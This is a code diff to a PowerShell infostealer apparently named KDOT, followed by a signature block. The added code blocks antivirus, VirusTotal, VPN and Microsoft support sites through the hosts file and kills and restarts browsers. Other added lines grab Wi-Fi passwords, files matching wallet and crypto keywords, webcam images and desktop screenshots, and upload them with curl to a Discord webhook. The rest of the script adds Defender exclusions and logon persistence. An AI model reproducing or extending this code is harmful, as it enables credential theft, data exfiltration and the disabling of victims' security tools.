@@ -13,6 +13,7 @@ function Compare-Mutex {
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 
 $webhook = "YOUR_WEBHOOK_HERE"
+$avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
 $debug_mode = $false
 $udc_mode = $true
 
@@ -199,6 +200,27 @@ function Invoke-ANTITOTAL {
     Invoke-ANTIVM
 }
 
+function HOSTS-BLOCKER {
+$KDOT = Select-String -Path "$env:windir\System32\Drivers\etc\hosts" -Pattern "GODFATHER"
+if ($KDOT -ne $null){}else{
+Add-Content c:\Windows\System32\Drivers\etc\hosts "`n#GODFATHER `n0.0.0.0 www.malwarebytes.com`n0.0.0.0 malwarebytes.com`n0.0.0.0 143.204.176.32`n0.0.0.0 www.antivirussoftwareguide.com`n0.0.0.0 antivirussoftwareguide.com`n0.0.0.0 68.183.21.156`n0.0.0.0 www.norton.com`n0.0.0.0 norton.com`n0.0.0.0 23.99.92.83`n0.0.0.0 www.avg.com`n0.0.0.0 avg.com`n0.0.0.0 69.94.64.29`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.avast.com`n0.0.0.0 avast.com`n0.0.0.0 2.22.100.83`n0.0.0.0 www.uk.pcmag.com`n0.0.0.0 uk.pcmag.com`n0.0.0.0 104.17.101.99`n0.0.0.0 www.bitdefender.co.uk`n0.0.0.0 bitdefender.co.uk`n0.0.0.0 172.64.144.176`n0.0.0.0 www.webroot.com`n0.0.0.0 webroot.com`n0.0.0.0 66.35.53.194`n0.0.0.0 www.mcafee.com`n0.0.0.0 mcafee.com`n0.0.0.0 161.69.29.243`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.go.crowdstrike.com`n0.0.0.0 go.crowdstrike.com`n0.0.0.0 104.18.64.82`n0.0.0.0 www.sophos.com`n0.0.0.0 sophos.com`n0.0.0.0 23.198.89.209`n0.0.0.0 www.f-secure.com`n0.0.0.0 f-secure.com`n0.0.0.0 23.198.76.113`n0.0.0.0 www.gdatasoftware.com`n0.0.0.0 gdatasoftware.com`n0.0.0.0 212.23.151.164`n0.0.0.0 www.trendmicro.com`n0.0.0.0 trendmicro.com`n0.0.0.0 216.104.20.24`n0.0.0.0 www.virustotal.com`n0.0.0.0 virustotal.com`n0.0.0.0 216.239.32.21`n0.0.0.0 www.acronis.com`n0.0.0.0 acronis.com`n0.0.0.0 34.120.97.237`n0.0.0.0 www.adaware.com`n0.0.0.0 adaware.com`n0.0.0.0 104.16.236.79`n0.0.0.0 www.ahnlab.com`n0.0.0.0 ahnlab.com`n0.0.0.0 211.233.80.53`n0.0.0.0 www.antiy.net`n0.0.0.0 antiy.net`n0.0.0.0 47.91.137.195`n0.0.0.0 www.symantec.com`n0.0.0.0 symantec.com`n0.0.0.0 50.112.202.115`n0.0.0.0 www.broadcom.com`n0.0.0.0 broadcom.com`n0.0.0.0 50.112.202.115`n0.0.0.0 www.superantispyware.com`n0.0.0.0 superantispyware.com`n0.0.0.0 44.231.57.118`n0.0.0.0 www.sophos.com`n0.0.0.0 sophos.com`n0.0.0.0 23.198.89.209`n0.0.0.0 www.sangfor.com`n0.0.0.0 sangfor.com`n0.0.0.0 151.101.2.133`n0.0.0.0 www.rising-global.com`n0.0.0.0 rising-global.com`n0.0.0.0 219.238.233.230`n0.0.0.0 www.webroot.com`n0.0.0.0 webroot.com`n0.0.0.0 66.35.53.194`n0.0.0.0 www.wearethinc.com`n0.0.0.0 wearethinc.com`n0.0.0.0 217.199.161.10`n0.0.0.0 www.cybernews.com`n0.0.0.0 cybernews.com`n0.0.0.0 172.66.43.197`n0.0.0.0 www.quickheal.com`n0.0.0.0 quickheal.com`n0.0.0.0 103.228.50.23`n0.0.0.0 www.pandasecurity.com`n0.0.0.0 pandasecurity.com`n0.0.0.0 91.216.218.44`n0.0.0.0 www.trendmicro.com`n0.0.0.0 trendmicro.com`n0.0.0.0 216.104.20.24`n0.0.0.0 www.guard.io`n0.0.0.0 guard.io`n0.0.0.0 34.102.139.130`n0.0.0.0 www.maxpcsecure.com`n0.0.0.0 maxpcsecure.com`n0.0.0.0 70.35.199.101`n0.0.0.0 www.maxsecureantivirus.com`n0.0.0.0 maxsecureantivirus.com`n0.0.0.0 70.35.199.101`n0.0.0.0 www.akamai.com`n0.0.0.0 akamai.com`n0.0.0.0 104.82.181.162`n0.0.0.0 www.lionic.com`n0.0.0.0 lionic.com`n0.0.0.0 220.130.53.233`n0.0.0.0 www.ccm.net`n0.0.0.0 ccm.net`n0.0.0.0 23.55.12.105`n0.0.0.0 www.kaspersky.co.uk`n0.0.0.0 kaspersky.co.uk`n0.0.0.0 185.85.15.26`n0.0.0.0 www.crowdstrike.com`n0.0.0.0 crowdstrike.com`n0.0.0.0 104.18.64.82`n0.0.0.0 www.k7computing.com`n0.0.0.0 k7computing.com`n0.0.0.0 52.172.54.225`n0.0.0.0 www.softonic.com`n0.0.0.0 softonic.com`n0.0.0.0 35.227.233.104`n0.0.0.0 www.ikarussecurity.com`n0.0.0.0 ikarussecurity.com`n0.0.0.0 91.212.136.200`n0.0.0.0 www.gridinsoft.com`n0.0.0.0 gridinsoft.com`n0.0.0.0 104.26.9.187`n0.0.0.0 www.simspace.com`n0.0.0.0 simspace.com`n0.0.0.0 104.21.82.22`n0.0.0.0 www.osirium.com`n0.0.0.0 osirium.com`n0.0.0.0 35.197.237.129`n0.0.0.0 www.gdatasoftware.co.uk`n0.0.0.0 gdatasoftware.co.uk`n0.0.0.0 212.23.151.164`n0.0.0.0 www.gdatasoftware.com`n0.0.0.0 gdatasoftware.com`n0.0.0.0 212.23.151.164`n0.0.0.0 www.basicsprotection.com`n0.0.0.0 basicsprotection.com`n0.0.0.0 3.111.153.145`n0.0.0.0 www.fortinet.com`n0.0.0.0 fortinet.com`n0.0.0.0 3.1.92.70`n0.0.0.0 www.f-secure.com`n0.0.0.0 f-secure.com`n0.0.0.0 23.198.76.113`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.escanav.com`n0.0.0.0 escanav.com`n0.0.0.0 67.222.129.224`n0.0.0.0 www.emsisoft.com`n0.0.0.0 emsisoft.com`n0.0.0.0 104.20.206.62`n0.0.0.0 www.drweb.com`n0.0.0.0 drweb.com`n0.0.0.0 178.248.233.94`n0.0.0.0 www.cyren.com`n0.0.0.0 cyren.com`n0.0.0.0 216.163.188.84`n0.0.0.0 www.cynet.com`n0.0.0.0 cynet.com`n0.0.0.0 172.67.38.94`n0.0.0.0 www.comodosslstore.com`n0.0.0.0 comodosslstore.com`n0.0.0.0 172.67.28.161`n0.0.0.0 www.clamav.net`n0.0.0.0 clamav.net`n0.0.0.0 198.148.79.54`n0.0.0.0 www.eset.com`n0.0.0.0 eset.com`n0.0.0.0 91.228.167.128`n0.0.0.0 www.totalav.com`n0.0.0.0 totalav.com`n0.0.0.0 34.117.198.220`n0.0.0.0 www.bitdefender.co.uk`n0.0.0.0 bitdefender.co.uk`n0.0.0.0 172.64.144.176`n0.0.0.0 www.baidu.com`n0.0.0.0 baidu.com`n0.0.0.0 39.156.66.10`n0.0.0.0 www.avira.com`n0.0.0.0 avira.com`n0.0.0.0 52.58.28.12`n0.0.0.0 www.avast.com`n0.0.0.0 avast.com`n0.0.0.0 2.22.100.83`n0.0.0.0 www.arcabit.pl`n0.0.0.0 arcabit.pl`n0.0.0.0 188.166.107.22`n0.0.0.0 www.surfshark.com`n0.0.0.0 surfshark.com`n0.0.0.0 104.18.120.34`n0.0.0.0 www.nordvpn.com`n0.0.0.0 nordvpn.com`n0.0.0.0 104.17.49.74`n0.0.0.0 support.microsoft.com`n0.0.0.0 www.support.microsoft.com`n"
+param ([string[]]$Browsers = @("chrome", "firefox", "iexplore", "opera", "brave", "msedge"))
+$terminatedProcesses = @()
+foreach ($browser in $Browsers) {
+    $process = Get-Process -Name $browser 
+    if ($process -ne $null) {
+        Stop-Process -Name $browser 
+        $terminatedProcesses += $browser
+    }
+}
+Start-Sleep -Seconds 4
+foreach ($browser in $terminatedProcesses) {
+   Start-Process $browser -ErrorAction SilentlyContinue
+}
+   return $terminatedProcesses
+}
+}
+
 function Request-Admin {
     while(!(Invoke-Admin_Check)) {
         try {
@@ -275,9 +297,9 @@ function Backup-Data {
     $avlist = get-installed-av -autosize | Format-Table | out-string
 
 
-    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object{ $_ } | ForEach-Object{(netsh wlan show profile name="$($_.Matches.Groups[1].Value.Trim())" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object{$_.Matches.Groups[1].Value.Trim()} | ForEach-Object{[PSCustomObject]@{ PROFILE_NAME=$($_.Matches.Groups[1].Value.Trim());PASSWORD=$_ }} | Out-String
-    $wifi = $wifipasslist | out-string 
-    $wifi > $folder_general\WIFIPasswords.txt
+   $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 
+   $wifi = $wifipasslist | out-string 
+   $wifi > $folder_general\WIFIPasswords.txt
 
     $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
     $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
@@ -852,17 +874,15 @@ function Backup-Data {
     Where-Object { $_.FormatDescription -eq "JPEG" }       
     Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing  | Out-Null
     try {
-        #region Import the Assemblies 
         [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | Out-Null 
         [reflection.assembly]::loadwithpartialname("System.Drawing") | Out-Null 
-        #endregion 
         $picCapture = New-Object System.Windows.Forms.PictureBox 
         try {
             $devices = [WebCamLib.DeviceManager]::GetAllDevices()
         } catch {
-            Write-Host "No camera found"
-            exit
-        }
+			Write-Host "No camera found"
+			
+		}
         $count = 0
         foreach ($device in $devices) {
             $imagePath = "$folder_general\out$count.jpg"
@@ -876,9 +896,9 @@ function Backup-Data {
         }
 
     } catch {
-            Write-Host "No camera found"
-            exit
-        }
+		Write-Host "No camera found"
+		
+	}
     }
  try {Get-WebCamImage} catch {}
 
@@ -886,10 +906,12 @@ function Backup-Data {
     $grabber = @(
         "2fa",
         "acc",
+		"atomic wallet",
         "account",
         "backup",
         "backupcode",
         "bitwarden",
+		"bitcoin",
         "code",
         "coinbase",
         "crypto",
@@ -909,6 +931,7 @@ function Backup-Data {
         "mail",
         "memo",
         "metamask",
+		"note",
         "nordpass",
         "pass",
         "paypal",
@@ -921,6 +944,7 @@ function Backup-Data {
         "wallet seed",
         "server",
         "syncthing",
+		"trading",
         "token",
         "wal",
         "wallet"
@@ -928,7 +952,7 @@ function Backup-Data {
     $dest = $important_files
     $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
     [regex] $grab_regex = "(" + (($grabber |ForEach-Object {[regex]::escape($_)}) -join "|") + ")"
-    (Get-ChildItem -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | Where-Object Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
+    (Get-ChildItem -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | Where-Object Length -lt 1mb) -match $grab_regex | Copy-Item -Destination $dest -Force
     }
     Invoke-GrabFiles
 
@@ -965,11 +989,26 @@ function Backup-Data {
 
     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
     $proc.WaitForExit()
+    
+    $main_temp = "$env:localappdata\temp"
+    $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
+    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    $screens = [Windows.Forms.Screen]::AllScreens
+    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
+    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
+    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
+    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
+    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+    $bmp.Save("$main_temp\screenshot.png")
+    $graphics.Dispose()
+    $bmp.Dispose()
+    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n> :triangular_ruler: **Size:** $($bounds.width)x$($bounds.height)\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null
 
-    $main_temp = "$env:LOCALAPPDATA\Temp"
-    curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$main_temp\desktop-screenshot.png\`"" $webhook | out-null
     Move-Item "$main_temp\tokens.txt" $folder_general -Force	
-    Move-Item "$main_temp\desktop-screenshot.png" $folder_general -Force
+    Move-Item "$main_temp\screenshot.png" $folder_general -Force
 	Move-Item -Path "$main_temp\browser-cookies.txt" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\browser-history.txt" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\browser-passwords.txt" -Destination "$browser_data" -Force
@@ -988,7 +1027,6 @@ function Backup-Data {
     Remove-Item "$main_temp\main.exe" -Force
 }
 
-
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
     Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
@@ -1002,9 +1040,9 @@ function Invoke-TASKS {
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
     Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
-    Backup-Data
+    HOSTS-BLOCKER
+	Backup-Data
 }
-
 
 if (Invoke-Admin_Check -eq $true) {
     if (!($debug_mode)) {
@@ -1024,3 +1062,126 @@ if (Invoke-Admin_Check -eq $true) {
     Start-Sleep -s 1
     Request-Admin
 }
+# SIG # Begin signature block
+# MIIWnAYJKoZIhvcNAQcCoIIWjTCCFokCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
+# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
+# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUjT50DNekpBm5RfFlJnH9m2Lq
+# aD+gghDrMIIC/jCCAeagAwIBAgIQRihd14UbBYBFYB6wG6qTWjANBgkqhkiG9w0B
+# AQsFADAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwHhcNMjQwMjI1MTc1MDM2WhcN
+# MzQwMjI1MTgwMDM2WjAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwggEiMA0GCSqG
+# SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCuGHL4cjbjwjkbEU6YB792yy6geMD6gIbj
+# IdPEG5iSpT5hVE2Cw40DcLreoSDoYYrAFuigwJ2cx0wXP3i3HCmqGv2meMqHkJSQ
+# B3yTNtxW1PUDJV+xtUmhpxEDNMUG0dXy89w5141UtIMbBLzUtogQh5Sv4czpLmFd
+# wetZxAyn4+BDqxk3U+0By70AAwjZaN9kCd2jpIcXfLFtBUvHixaHvry3L1HCFjxr
+# ZzfLrjop5rZvA0fbaxlq/B+nWDJnJiAnxV1Um0QrHF/NLkwpmRAmNDMQWBynyFnj
+# 0zDO+wR+t5krDnlRVewLt9341eaO/DJ+y10YNBhvr8loqxoMqYQVAgMBAAGjRjBE
+# MA4GA1UdDwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU
+# 65VlAxlZ3FuFpb4JW3urUvQXdnEwDQYJKoZIhvcNAQELBQADggEBAAd9hMR1Xugr
+# ojsGXl8iXpzjYLXJhwOBbRDDhr/PHGP240ZR5/OjkrQv7pjBHfWMXnwfaGMKWVp7
+# WKeJJsF/Cg7DTPTp7GyPIfnn2zZv5IJgdaKjkKfVV3KzoqjesgbtqQhUh/KCf37Z
+# j8GLjGsvxxC4A4NXFyCEyusG3RDwMDfo4kdCVh9aX2OvR1j1Zu5Ud5UpoUTkighb
+# LXQq8mtjrAchM+ojNHVoU52+WX3yQpPqmhnCn5firTRhmWh17Z5ukciMUweRp/rD
+# wcbraTfVypJUB5ROoR+i60p+5GsOH9yLYIQgjpWCKSY7uZt67CfNfS2ToIwz287e
+# U/vWw7g/MCswggbsMIIE1KADAgECAhAwD2+s3WaYdHypRjaneC25MA0GCSqGSIb3
+# DQEBDAUAMIGIMQswCQYDVQQGEwJVUzETMBEGA1UECBMKTmV3IEplcnNleTEUMBIG
+# A1UEBxMLSmVyc2V5IENpdHkxHjAcBgNVBAoTFVRoZSBVU0VSVFJVU1QgTmV0d29y
+# azEuMCwGA1UEAxMlVVNFUlRydXN0IFJTQSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0
+# eTAeFw0xOTA1MDIwMDAwMDBaFw0zODAxMTgyMzU5NTlaMH0xCzAJBgNVBAYTAkdC
+# MRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0ZXIxEDAOBgNVBAcTB1NhbGZvcmQx
+# GDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDElMCMGA1UEAxMcU2VjdGlnbyBSU0Eg
+# VGltZSBTdGFtcGluZyBDQTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
+# AMgbAa/ZLH6ImX0BmD8gkL2cgCFUk7nPoD5T77NawHbWGgSlzkeDtevEzEk0y/NF
+# Zbn5p2QWJgn71TJSeS7JY8ITm7aGPwEFkmZvIavVcRB5h/RGKs3EWsnb111JTXJW
+# D9zJ41OYOioe/M5YSdO/8zm7uaQjQqzQFcN/nqJc1zjxFrJw06PE37PFcqwuCnf8
+# DZRSt/wflXMkPQEovA8NT7ORAY5unSd1VdEXOzQhe5cBlK9/gM/REQpXhMl/VuC9
+# RpyCvpSdv7QgsGB+uE31DT/b0OqFjIpWcdEtlEzIjDzTFKKcvSb/01Mgx2Bpm1gK
+# VPQF5/0xrPnIhRfHuCkZpCkvRuPd25Ffnz82Pg4wZytGtzWvlr7aTGDMqLufDRTU
+# GMQwmHSCIc9iVrUhcxIe/arKCFiHd6QV6xlV/9A5VC0m7kUaOm/N14Tw1/AoxU9k
+# gwLU++Le8bwCKPRt2ieKBtKWh97oaw7wW33pdmmTIBxKlyx3GSuTlZicl57rjsF4
+# VsZEJd8GEpoGLZ8DXv2DolNnyrH6jaFkyYiSWcuoRsDJ8qb/fVfbEnb6ikEk1Bv8
+# cqUUotStQxykSYtBORQDHin6G6UirqXDTYLQjdprt9v3GEBXc/Bxo/tKfUU2wfeN
+# gvq5yQ1TgH36tjlYMu9vGFCJ10+dM70atZ2h3pVBeqeDAgMBAAGjggFaMIIBVjAf
+# BgNVHSMEGDAWgBRTeb9aqitKz1SA4dibwJ3ysgNmyzAdBgNVHQ4EFgQUGqH4YRkg
+# D8NBd0UojtE1XwYSBFUwDgYDVR0PAQH/BAQDAgGGMBIGA1UdEwEB/wQIMAYBAf8C
+# AQAwEwYDVR0lBAwwCgYIKwYBBQUHAwgwEQYDVR0gBAowCDAGBgRVHSAAMFAGA1Ud
+# HwRJMEcwRaBDoEGGP2h0dHA6Ly9jcmwudXNlcnRydXN0LmNvbS9VU0VSVHJ1c3RS
+# U0FDZXJ0aWZpY2F0aW9uQXV0aG9yaXR5LmNybDB2BggrBgEFBQcBAQRqMGgwPwYI
+# KwYBBQUHMAKGM2h0dHA6Ly9jcnQudXNlcnRydXN0LmNvbS9VU0VSVHJ1c3RSU0FB
+# ZGRUcnVzdENBLmNydDAlBggrBgEFBQcwAYYZaHR0cDovL29jc3AudXNlcnRydXN0
+# LmNvbTANBgkqhkiG9w0BAQwFAAOCAgEAbVSBpTNdFuG1U4GRdd8DejILLSWEEbKw
+# 2yp9KgX1vDsn9FqguUlZkClsYcu1UNviffmfAO9Aw63T4uRW+VhBz/FC5RB9/7B0
+# H4/GXAn5M17qoBwmWFzztBEP1dXD4rzVWHi/SHbhRGdtj7BDEA+N5Pk4Yr8TAcWF
+# o0zFzLJTMJWk1vSWVgi4zVx/AZa+clJqO0I3fBZ4OZOTlJux3LJtQW1nzclvkD1/
+# RXLBGyPWwlWEZuSzxWYG9vPWS16toytCiiGS/qhvWiVwYoFzY16gu9jc10rTPa+D
+# BjgSHSSHLeT8AtY+dwS8BDa153fLnC6NIxi5o8JHHfBd1qFzVwVomqfJN2Udvuq8
+# 2EKDQwWli6YJ/9GhlKZOqj0J9QVst9JkWtgqIsJLnfE5XkzeSD2bNJaaCV+O/fex
+# UpHOP4n2HKG1qXUfcb9bQ11lPVCBbqvw0NP8srMftpmWJvQ8eYtcZMzN7iea5aDA
+# DHKHwW5NWtMe6vBE5jJvHOsXTpTDeGUgOw9Bqh/poUGd/rG4oGUqNODeqPk85sEw
+# u8CgYyz8XBYAqNDEf+oRnR4GxqZtMl20OAkrSQeq/eww2vGnL8+3/frQo4TZJ577
+# AWZ3uVYQ4SBuxq6x+ba6yDVdM3aO8XwgDCp3rrWiAoa6Ke60WgCxjKvj+QrJVF3U
+# uWp0nr1Irpgwggb1MIIE3aADAgECAhA5TCXhfKBtJ6hl4jvZHSLUMA0GCSqGSIb3
+# DQEBDAUAMH0xCzAJBgNVBAYTAkdCMRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0
+# ZXIxEDAOBgNVBAcTB1NhbGZvcmQxGDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDEl
+# MCMGA1UEAxMcU2VjdGlnbyBSU0EgVGltZSBTdGFtcGluZyBDQTAeFw0yMzA1MDMw
+# MDAwMDBaFw0zNDA4MDIyMzU5NTlaMGoxCzAJBgNVBAYTAkdCMRMwEQYDVQQIEwpN
+# YW5jaGVzdGVyMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxLDAqBgNVBAMMI1Nl
+# Y3RpZ28gUlNBIFRpbWUgU3RhbXBpbmcgU2lnbmVyICM0MIICIjANBgkqhkiG9w0B
+# AQEFAAOCAg8AMIICCgKCAgEApJMoUkvPJ4d2pCkcmTjA5w7U0RzsaMsBZOSKzXew
+# cWWCvJ/8i7u7lZj7JRGOWogJZhEUWLK6Ilvm9jLxXS3AeqIO4OBWZO2h5YEgciBk
+# QWzHwwj6831d7yGawn7XLMO6EZge/NMgCEKzX79/iFgyqzCz2Ix6lkoZE1ys/Oer
+# 6RwWLrCwOJVKz4VQq2cDJaG7OOkPb6lampEoEzW5H/M94STIa7GZ6A3vu03lPYxU
+# A5HQ/C3PVTM4egkcB9Ei4GOGp7790oNzEhSbmkwJRr00vOFLUHty4Fv9GbsfPGoZ
+# e267LUQqvjxMzKyKBJPGV4agczYrgZf6G5t+iIfYUnmJ/m53N9e7UJ/6GCVPE/Je
+# fKmxIFopq6NCh3fg9EwCSN1YpVOmo6DtGZZlFSnF7TMwJeaWg4Ga9mBmkFgHgM1C
+# daz7tJHQxd0BQGq2qBDu9o16t551r9OlSxihDJ9XsF4lR5F0zXUS0Zxv5F4Nm+x1
+# Ju7+0/WSL1KF6NpEUSqizADKh2ZDoxsA76K1lp1irScL8htKycOUQjeIIISoh67D
+# uiNye/hU7/hrJ7CF9adDhdgrOXTbWncC0aT69c2cPcwfrlHQe2zYHS0RQlNxdMLl
+# NaotUhLZJc/w09CRQxLXMn2YbON3Qcj/HyRU726txj5Ve/Fchzpk8WBLBU/vuS/s
+# CRMCAwEAAaOCAYIwggF+MB8GA1UdIwQYMBaAFBqh+GEZIA/DQXdFKI7RNV8GEgRV
+# MB0GA1UdDgQWBBQDDzHIkSqTvWPz0V1NpDQP0pUBGDAOBgNVHQ8BAf8EBAMCBsAw
+# DAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDBKBgNVHSAEQzBB
+# MDUGDCsGAQQBsjEBAgEDCDAlMCMGCCsGAQUFBwIBFhdodHRwczovL3NlY3RpZ28u
+# Y29tL0NQUzAIBgZngQwBBAIwRAYDVR0fBD0wOzA5oDegNYYzaHR0cDovL2NybC5z
+# ZWN0aWdvLmNvbS9TZWN0aWdvUlNBVGltZVN0YW1waW5nQ0EuY3JsMHQGCCsGAQUF
+# BwEBBGgwZjA/BggrBgEFBQcwAoYzaHR0cDovL2NydC5zZWN0aWdvLmNvbS9TZWN0
+# aWdvUlNBVGltZVN0YW1waW5nQ0EuY3J0MCMGCCsGAQUFBzABhhdodHRwOi8vb2Nz
+# cC5zZWN0aWdvLmNvbTANBgkqhkiG9w0BAQwFAAOCAgEATJtlWPrgec/vFcMybd4z
+# ket3WOLrvctKPHXefpRtwyLHBJXfZWlhEwz2DJ71iSBewYfHAyTKx6XwJt/4+DFl
+# DeDrbVFXpoyEUghGHCrC3vLaikXzvvf2LsR+7fjtaL96VkjpYeWaOXe8vrqRZIh1
+# /12FFjQn0inL/+0t2v++kwzsbaINzMPxbr0hkRojAFKtl9RieCqEeajXPawhj3DD
+# JHk6l/ENo6NbU9irALpY+zWAT18ocWwZXsKDcpCu4MbY8pn76rSSZXwHfDVEHa1Y
+# GGti+95sxAqpbNMhRnDcL411TCPCQdB6ljvDS93NkiZ0dlw3oJoknk5fTtOPD+UT
+# T1lEZUtDZM9I+GdnuU2/zA2xOjDQoT1IrXpl5Ozf4AHwsypKOazBpPmpfTXQMkCg
+# sRkqGCGyyH0FcRpLJzaq4Jgcg3Xnx35LhEPNQ/uQl3YqEqxAwXBbmQpA+oBtlGF7
+# yG65yGdnJFxQjQEg3gf3AdT4LhHNnYPl+MolHEQ9J+WwhkcqCxuEdn17aE+Nt/cT
+# tO2gLe5zD9kQup2ZLHzXdR+PEMSU5n4k5ZVKiIwn1oVmHfmuZHaR6Ej+yFUK7SnD
+# H944psAU+zI9+KmDYjbIw74Ahxyr+kpCHIkD3PVcfHDZXXhO7p9eIOYJanwrCKNI
+# 9RX8BE/fzSEceuX1jhrUuUAxggUbMIIFFwIBATArMBcxFTATBgNVBAMMDEtET1Qg
+# Um9vdCBDQQIQRihd14UbBYBFYB6wG6qTWjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGC
+# NwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgor
+# BgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUILwkDIiG
+# iorkl2EliSz9w4wfXnEwDQYJKoZIhvcNAQEBBQAEggEAYIUOpaOBaEP3sTM7TCN7
+# oOAPX8Et1B8gumiWNzFVEqjZIlxEs21BlK/E4y8Mn0h1PUDwh0pqsyfBTZwbQhKB
+# mbSSV3K0P98EbIpipGIV0I8zXY2MGv6RS5dYLQ2rSk3O9FYxGT9CspbpkxX2YEmd
+# q2IiZHDQRAjY4ISjaezRvxowtYxRdvhetCcjK/i08plrE6Wn4oXYMBRqNLBNpq2r
+# qAMQzc+Z/Q744G9FBexLeNNVzO9gEzzpfmT7F/e9+MI5p2NjFLy0VYEa2IaP910Q
+# ukFXUJ+AbwL5YnxQ9oTwtUjnbmkcoIJlHirJN6PAB1neZ8LJC28Qq5g9TvL0jkUp
+# kKGCA0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQswCQYDVQQGEwJH
+# QjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxmb3Jk
+# MRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3RpZ28gUlNB
+# IFRpbWUgU3RhbXBpbmcgQ0ECEDlMJeF8oG0nqGXiO9kdItQwDQYJYIZIAWUDBAIC
+# BQCgeTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0y
+# NDAyMjUxODAwNDJaMD8GCSqGSIb3DQEJBDEyBDCb1i/66IeWQD8JdS1ilmWv1Ij0
+# LUpnouTKQ6++y3Dg/OpoMQ6Jb3S/Jt7BRi/vctkwDQYJKoZIhvcNAQEBBQAEggIA
+# oTcy7tawY5ZFfkBFRmb1BBSDkZ+a7HQaCZj5tEvMAvVAqjQhkHWXfOYrPMxPZq7P
+# 8cbWMew/yWru50EnOzvFqs6eODrrH5IjeiHgmrbjundhQoHVJaaT4RefvC3EemXk
+# K95mcWvj22HIxa9qNaNf6rX02VyjkGtD7mrNrB/zWUan/lrKvmnoTrORb8+wPv+m
+# TMPbjysEqxX+zd7vdG080HNQOtz2UVJAkzCWM9SXxrswNx58dIoJHfVBzvuutXlS
+# NX6d72CapbXpLo5JjtVRZI+2zihJFiH6GrCRi5k6y62yfq1JIT8IfQ/xzWnztKCa
